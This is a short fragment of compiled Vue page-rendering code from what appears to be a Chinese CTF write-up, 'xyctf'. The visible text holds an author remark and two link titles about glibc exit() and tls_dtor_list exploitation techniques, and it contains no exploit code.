结果发现想复杂了 这里保留了原本的构思代码")]),m]),b,n("ul",null,[v,g,n("li",null,[x,n("blockquote",null,[n("p",null,[s("大概思路:"),n("a",h,[s("exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)"),p(a)])]),n("p",null,[s("["),n("a",q,[s("原创] Glibc-2.35下对tls_dtor_list的利用详解-Pwn-看雪-安全社区|安全招聘|kanxue.com"),p(a)])]),f])])]),y])}const j=e(u,[["render",w],["__file","xyctf.html.vue"]]);export{j as default};
